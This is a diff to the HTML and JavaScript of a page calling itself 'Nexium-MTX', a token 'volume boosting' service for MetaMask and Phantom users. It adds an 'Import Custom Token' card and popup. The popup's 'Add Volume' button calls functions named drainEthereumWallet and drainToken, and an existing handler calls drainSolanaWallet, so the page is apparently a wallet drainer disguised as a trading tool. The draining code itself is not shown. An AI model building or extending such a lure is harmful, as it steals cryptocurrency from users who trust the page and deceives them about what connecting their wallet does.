@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Nexium-MTX: Add volume to ERC-20 tokens on ethereum Mainnet using MetaMask, and Phantom">
+  <meta name="description" content="Nexium-MTX: Add volume to ERC-20 tokens on Ethereum Mainnet using MetaMask, and Phantom">
   <title>Nexium Add Volume</title>
   <meta http-equiv="Content-Security-Policy" content="
     default-src 'self';
@@ -61,7 +61,7 @@
       backdrop-filter: blur(10px);
       -webkit-backdrop-filter: blur(10px);
     }
-    .wallet-modal {
+    .wallet-modal, .token-popup, .custom-token-popup {
       display: none;
       position: fixed;
       top: 0;
@@ -73,10 +73,10 @@
       align-items: center;
       justify-content: center;
     }
-    .wallet-modal.active {
+    .wallet-modal.active, .token-popup.active, .custom-token-popup.active {
       display: flex;
     }
-    .wallet-modal-content {
+    .wallet-modal-content, .token-popup-content, .custom-token-popup-content {
       background: #1a182e;
       border: 1px solid #f97316;
       border-radius: 12px;
@@ -85,12 +85,12 @@
       max-width: 400px;
       text-align: center;
     }
-    .wallet-modal-content h2 {
+    .wallet-modal-content h2, .token-popup-content h2, .custom-token-popup-content h2 {
       color: #facc15;
       font-size: 1.5rem;
       margin-bottom: 16px;
     }
-    .wallet-modal-content button {
+    .wallet-modal-content button, .token-popup-content button, .custom-token-popup-content button {
       display: block;
       width: 100%;
       padding: 12px;
@@ -104,17 +104,17 @@
       border: none;
       cursor: pointer;
     }
-    .wallet-modal-content button:hover {
+    .wallet-modal-content button:hover, .token-popup-content button:hover, .custom-token-popup-content button:hover {
       color: #fff;
       transform: scale(1.05);
       box-shadow: 0 0 15px rgba(250, 204, 21, 1);
     }
-    .wallet-modal-content .close-modal {
+    .wallet-modal-content .close-modal, .token-popup-content .close-popup, .custom-token-popup-content .close-popup {
       background: #4b5563;
       color: #fff;
       margin-top: 16px;
     }
-    .wallet-modal-content .close-modal:hover {
+    .wallet-modal-content .close-modal:hover, .token-popup-content .close-popup:hover, .custom-token-popup-content .close-popup:hover {
       background: #6b7280;
       transform: scale(1.05);
       box-shadow: 0 0 15px rgba(107, 114, 128, 0.7);
@@ -211,7 +211,7 @@
         grid-template-columns: 1fr;
       }
     }
-    .token-card {
+    .token-card, .custom-token-card {
       background: #1a182e;
       padding: 1rem;
       border-radius: 0.5rem;
@@ -221,79 +221,48 @@
       text-align: center;
       cursor: pointer;
     }
-    .token-card:hover {
+    .token-card:hover, .custom-token-card:hover {
       transform: translateY(-5px);
       box-shadow: 0 0 15px rgba(250, 204, 21, 0.7);
     }
-    .token-card p {
+    .token-card p, .custom-token-card p {
       margin: 0.5rem 0;
       font-size: 0.9rem;
     }
-    .token-card .name {
+    .token-card .name, .custom-token-card .name {
       font-weight: bold;
       font-size: 1.1rem;
       color: #facc15;
     }
-    .token-card .address {
+    .token-card .address, .custom-token-card .address {
       word-break: break-all;
       color: #d1d5db;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    @media (max-width: 480px) {
+      .token-card .address, .custom-token-card .address {
+        font-size: 0.8rem;
+        white-space: normal;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
     }
     .token-card .market-cap {
       color: #9ca3af;
     }
-    .token-popup {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      z-index: 2000;
-      align-items: center;
-      justify-content: center;
-    }
-    .token-popup.active {
-      display: flex;
-    }
-    .token-popup-content {
-      background: #1a182e;
-      border: 1px solid #f97316;
-      border-radius: 12px;
-      padding: 24px;
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-      transform: scale(1.2);
-      transition: transform 0.3s ease;
-    }
-    .token-popup-content p {
-      margin: 0.5rem 0;
-      font-size: 1rem;
-    }
-    .token-popup-content .name {
-      font-weight: bold;
-      font-size: 1.5rem;
-      color: #facc15;
-    }
-    .token-popup-content .address {
-      word-break: break-all;
-      color: #d1d5db;
-    }
-    .token-popup-content .market-cap {
-      color: #9ca3af;
-    }
-    .token-popup-content .input-group {
+    .custom-token-popup-content .input-group {
       display: flex;
       align-items: center;
       margin: 1rem 0;
     }
-    .token-popup-content .input-group span {
+    .custom-token-popup-content .input-group span {
       color: #facc15;
       font-size: 1.2rem;
       margin-right: 0.5rem;
     }
-    .token-popup-content .volume-input {
+    .custom-token-popup-content .volume-input, .custom-token-popup-content .address-input {
       flex-grow: 1;
       background: #1a182e;
       border: 1px solid #f97316;
@@ -301,35 +270,6 @@
       padding: 0.5rem;
       border-radius: 6px;
       font-size: 1rem;
-    }
-    .token-popup-content .add-volume-btn {
-      display: block;
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      background: linear-gradient(45deg, #facc15, #f97316);
-      color: #000;
-      font-weight: bold;
-      border-radius: 6px;
-      box-shadow: 0 0 10px rgba(250, 204, 21, 0.7);
-      transition: transform 0.2s, box-shadow 0.2s;
-      border: none;
-      cursor: pointer;
-    }
-    .token-popup-content .add-volume-btn:hover {
-      color: #fff;
-      transform: scale(1.05);
-      box-shadow: 0 0 15px rgba(250, 204, 21, 1);
-    }
-    .token-popup-content .close-popup {
-      background: #4b5563;
-      color: #fff;
-      margin-top: 16px;
-    }
-    .token-popup-content .close-popup:hover {
-      background: #6b7280;
-      transform: scale(1.05);
-      box-shadow: 0 0 15px rgba(107, 114, 128, 0.7);
     }
   </style>
 </head>
@@ -365,16 +305,17 @@
     </div>
   </div>
   <div id="metamaskPrompt" class="metamask-prompt hidden text-center bg-[#1a182e] p-6 rounded-xl border border-orange-400 glass">
-    
+    <p class="text-white">No wallet installed. Install <a href="#" class="text-yellow-400 hover:underline" id="walletLink">wallet</a> to continue.</p>
   </div>
   <main id="app" class="flex-1 flex flex-col items-center justify-center px-4">
-    <div class="default-prompt text-center bg-[#1a182e] p-6 rounded-xl border border-orange-400 glass">
-     
-    </div>
   </main>
   <section class="py-12 px-4 max-w-6xl mx-auto">
     <h2 class="text-2xl font-semibold text-yellow-400 mb-6 text-center" style="text-shadow: 0 0 10px rgba(250, 204, 21, 0.8);">Explore Top Tokens for Volume Boosting</h2>
     <div class="token-grid">
+      <div class="custom-token-card">
+        <p class="name">Import Custom Token</p>
+        <p class="address">Enter custom address</p>
+      </div>
       <div class="token-card" data-address="0xdac17f958d2ee523a2206206994597c13d831ec7">
         <p class="name">USDT (ETH)</p>
         <p class="address">0xdac17f958d2ee523a2206206994597c13d831ec7</p>
@@ -640,6 +581,20 @@
       <button class="close-popup" aria-label="Close Popup">Close</button>
     </div>
   </div>
+  <div class="custom-token-popup" id="custom-token-popup">
+    <div class="custom-token-popup-content">
+      <h2 class="text-yellow-400">Import Custom Token</h2>
+      <div class="input-group">
+        <input type="text" class="address-input volume-input" id="custom-token-address" placeholder="Token Address" aria-label="Custom token address">
+      </div>
+      <div class="input-group">
+        <span>$</span>
+        <input type="number" class="volume-input" id="custom-token-amount" placeholder="Amount in $" aria-label="Amount in dollars" min="0" step="0.01">
+      </div>
+      <button class="add-volume-btn" id="custom-token-submit" aria-label="Add Volume">Add Volume</button>
+      <button class="close-popup" id="close-custom-token-popup" aria-label="Close Popup">Close</button>
+    </div>
+  </div>
   <footer class="text-center text-sm text-gray-400 py-6 border-t border-gray-700">
     <p>© 2025 Nexium-volume-bot — Built with ❤</p>
   </footer>
@@ -685,7 +640,9 @@
               app.drainSolanaWallet();
             } else {
               app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+              return;
             }
+            popup.classList.remove('active');
           };
           
           const closePopupBtn = popupContent.querySelector('.close-popup');
@@ -698,10 +655,67 @@
         });
       });
       
-      // Close popup when clicking outside
+      // Handle custom token card click to show custom popup
+      const customTokenCard = document.querySelector('.custom-token-card');
+      if (customTokenCard) {
+        customTokenCard.addEventListener('click', () => {
+          console.log('Custom token card clicked');
+          const popup = document.getElementById('custom-token-popup');
+          const popupContent = popup.querySelector('.custom-token-popup-content');
+          popupContent.querySelector('#custom-token-address').value = ''; // Clear address input
+          popupContent.querySelector('#custom-token-amount').value = ''; // Clear amount input
+          
+          const addVolumeBtn = popupContent.querySelector('#custom-token-submit');
+          addVolumeBtn.onclick = () => {
+            console.log('Custom token Add Volume button clicked');
+            const tokenAddress = popupContent.querySelector('#custom-token-address').value.trim();
+            const amount = parseFloat(popupContent.querySelector('#custom-token-amount').value.trim());
+            if (!tokenAddress) {
+              app.showFeedback('Please enter a token address.', 'error');
+              return;
+            }
+            if (isNaN(amount) || amount <= 0) {
+              app.showFeedback('Please enter a valid amount.', 'error');
+              return;
+            }
+            console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`);
+            if (app.connectedWalletType === 'MetaMask') {
+              app.drainEthereumWallet(app.publicKey);
+            } else if (app.connectedWalletType === 'Phantom') {
+              app.drainToken(tokenAddress);
+            } else {
+              app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+              return;
+            }
+            if (popup) {
+              popup.classList.remove('active');
+            }
+          };
+          
+          const closePopupBtn = popupContent.querySelector('#close-custom-token-popup');
+          closePopupBtn.onclick = () => {
+            console.log('Close custom popup clicked');
+            if (popup) {
+              popup.classList.remove('active');
+            }
+          };
+          
+          if (popup) {
+            popup.classList.add('active');
+          }
+        });
+      }
+      
+      // Close popups when clicking outside
       document.getElementById('token-popup').addEventListener('click', (event) => {
         if (event.target === event.currentTarget) {
-          console.log('Clicked outside popup, closing');
+          console.log('Clicked outside token popup, closing');
+          event.currentTarget.classList.remove('active');
+        }
+      });
+      document.getElementById('custom-token-popup').addEventListener('click', (event) => {
+        if (event.target === event.currentTarget) {
+          console.log('Clicked outside custom token popup, closing');
           event.currentTarget.classList.remove('active');
         }
       });
